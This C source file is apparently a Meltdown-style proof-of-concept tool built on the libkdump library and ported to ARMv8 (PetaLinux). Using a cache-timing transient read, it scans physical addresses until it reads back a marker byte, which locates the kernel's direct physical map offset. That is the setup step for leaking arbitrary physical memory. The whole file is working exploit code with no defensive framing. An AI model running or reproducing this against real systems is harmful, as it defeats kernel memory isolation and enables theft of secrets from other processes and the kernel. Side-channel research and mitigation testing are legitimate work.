#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  size_t scratch[4096];
  libkdump_config_t config;
  
  // Initialize config manually as autoconfig is removed
  memset(&config, 0, sizeof(libkdump_config_t));
  config.cache_miss_threshold = 100; 
  config.retries = 10;
  config.measurements = 1;
  config.physical_offset = 0x80000000; // Default for FZ3/PetaLinux

  size_t offset = config.physical_offset;
  
  // Step size for ARMv8 physical map scanning
  size_t step = 0x1000000;
  size_t delta = -2 * step;
  int progress = 0;

  // libkdump_enable_debug is removed in the ARM port
  libkdump_init(config);

  size_t var = (size_t)(scratch + 2048);
  *(char *)var = 'X';

  size_t start = libkdump_virt_to_phys(var);
  if (!start) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    exit(1);
  }

  while (1) {
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';
    *(volatile char *)var = 'X';

    // Read using the physical address as expected by the adapted libkdump_read
    int res = libkdump_read(start + offset + delta);
    if (res == 'X') {
      printf("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
      fflush(stdout);
      break;
    } else {
      delta += step;
      if (delta >= -1ull - offset) {
        delta = 0;
        step >>= 4;
      }
      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
    }
  }

  libkdump_cleanup();
  return 0;
}